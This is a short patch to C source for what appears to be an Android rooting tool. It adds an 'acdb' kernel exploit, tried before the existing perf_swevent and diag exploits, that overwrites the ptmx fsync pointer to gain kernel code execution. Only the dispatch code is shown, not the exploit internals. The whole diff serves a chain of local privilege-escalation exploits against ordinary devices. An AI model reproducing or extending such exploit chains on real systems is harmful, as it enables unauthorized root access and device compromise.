@@ -8,6 +8,7 @@
 
 #include "detect_device.h"
 #include "perf_swevent.h"
+#include "acdb.h"
 #include "ptmx.h"
 #include "mm.h"
 #include "libdiagexploit/diag.h"
@@ -263,6 +264,12 @@ run_exploit(void)
   }
 
   ptmx_fsync_address = ptmx_fops_address + 0x38;
+
+  printf("Attempt acdb exploit...\n");
+  if (acdb_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                       run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
 
   printf("Attempt perf_swevent exploit...\n");
   if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
